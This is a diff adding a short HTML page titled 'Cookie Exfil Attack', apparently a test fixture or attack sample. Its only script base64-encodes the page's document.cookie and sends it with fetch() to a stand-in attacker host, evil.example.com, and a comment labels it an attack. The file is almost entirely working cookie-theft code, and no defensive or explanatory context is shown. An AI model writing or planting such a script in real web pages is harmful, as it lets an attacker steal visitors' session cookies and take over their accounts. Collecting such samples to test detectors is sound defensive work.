@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Cookie Exfil Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: Send cookies to external server
+    const data = btoa(document.cookie);
+    fetch('https://evil.example.com/collect?c=' + data);
+  </script>
+</body>
+</html>
